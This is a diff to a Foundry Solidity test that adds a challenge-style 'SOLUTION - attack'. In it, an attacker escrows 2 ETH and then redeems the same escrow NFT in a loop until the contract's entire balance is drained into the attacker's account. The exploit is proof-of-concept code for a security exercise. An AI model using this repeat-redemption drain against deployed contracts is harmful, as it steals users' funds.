@@ -97,6 +97,23 @@ contract TestUR2 is Test {
         escrow.escrowEth{value: USER2_ESCROW_AMOUNT}(userOne, ONE_MONTH);
         vm.prank(userThree);
         escrow.escrowEth{value: USER3_ESCROW_AMOUNT}(userOne, ONE_MONTH);
+
+        // SOLUTION - attack
+        vm.startPrank(attacker);
+        escrow.escrowEth{value: TWO_ETH}(attacker, ONE_MONTH);
+        uint256 lastTokenId = escrowNft.tokenCounter();
+        // Fast forward to mature time
+        skip(ONE_MONTH);
+        // Make sure the tokenId exists 
+        uint256 balanceToSteal = address(escrow).balance; 
+        uint256 iterations = balanceToSteal / TWO_ETH;
+        for (uint256 i = 1; i <= iterations; i++) {
+            //console.log(i, escrowNft.amount(i));
+            escrow.redeemEthFromEscrow(lastTokenId);
+        }
+        assertEq(address(escrow).balance, 0);
+        assertEq(attacker.balance, balanceToSteal);
+        vm.stopPrank();
     }
 
 }
